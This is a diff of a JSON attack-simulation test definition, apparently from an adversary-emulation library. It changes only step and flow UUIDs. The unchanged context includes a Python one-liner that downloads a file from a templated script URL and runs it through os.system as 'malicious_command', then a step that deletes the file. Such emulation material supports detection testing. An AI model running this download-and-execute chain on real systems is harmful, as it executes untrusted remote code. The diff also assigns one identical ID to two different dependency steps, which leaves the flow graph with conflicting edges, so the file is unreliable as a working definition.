@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "be0ab7ce-911f-4516-83c7-9aedf86529c0",
+      "id": "1b3e65a8-af9a-51de-bbc1-16f64327d838",
       "type": "execute-command",
       "data": {
         "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "37060277-c8c1-40a1-b2ce-fe159849e683",
+      "id": "85b233ef-2add-503a-a807-8be477a3620e",
       "type": "execute-command",
       "data": {
         "command": "rm #{payload_file_name}",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "13e80ace-aa33-4254-be5b-e089d5d86cf9",
+      "id": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "name": "Check dependency 1/1",
       "description": "Verify if python is in the environment variable path and attempt to import requests library.",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "78885ebe-5b6f-4c17-ab7f-35476c651841",
+      "id": "6bfbce30-57c1-514d-ab22-57d43dc1f6ba",
       "name": "Resolve dependency 1/1",
       "description": "Verify if python is in the environment variable path and attempt to import requests library.",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "14078568-c77e-4ad9-88fb-3bc7477a69b3",
+      "id": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "name": "Re-check dependency 1/1",
       "description": "Verify if python is in the environment variable path and attempt to import requests library.",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "be0ab7ce-911f-4516-83c7-9aedf86529c0",
+      "s": "1b3e65a8-af9a-51de-bbc1-16f64327d838",
       "p": "on-success",
-      "o": "37060277-c8c1-40a1-b2ce-fe159849e683"
+      "o": "85b233ef-2add-503a-a807-8be477a3620e"
     },
     {
-      "s": "be0ab7ce-911f-4516-83c7-9aedf86529c0",
+      "s": "1b3e65a8-af9a-51de-bbc1-16f64327d838",
       "p": "on-failure",
-      "o": "37060277-c8c1-40a1-b2ce-fe159849e683"
+      "o": "85b233ef-2add-503a-a807-8be477a3620e"
     },
     {
-      "s": "13e80ace-aa33-4254-be5b-e089d5d86cf9",
+      "s": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "p": "on-success",
-      "o": "be0ab7ce-911f-4516-83c7-9aedf86529c0"
+      "o": "1b3e65a8-af9a-51de-bbc1-16f64327d838"
     },
     {
-      "s": "13e80ace-aa33-4254-be5b-e089d5d86cf9",
+      "s": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "p": "on-failure",
-      "o": "78885ebe-5b6f-4c17-ab7f-35476c651841"
+      "o": "6bfbce30-57c1-514d-ab22-57d43dc1f6ba"
     },
     {
-      "s": "78885ebe-5b6f-4c17-ab7f-35476c651841",
+      "s": "6bfbce30-57c1-514d-ab22-57d43dc1f6ba",
       "p": "on-success",
-      "o": "14078568-c77e-4ad9-88fb-3bc7477a69b3"
+      "o": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54"
     },
     {
-      "s": "14078568-c77e-4ad9-88fb-3bc7477a69b3",
+      "s": "618e9dbd-e8df-5e5b-b6b2-e2ff0b200f54",
       "p": "on-failure",
-      "o": "be0ab7ce-911f-4516-83c7-9aedf86529c0"
+      "o": "1b3e65a8-af9a-51de-bbc1-16f64327d838"
     }
   ],
   "tags": [
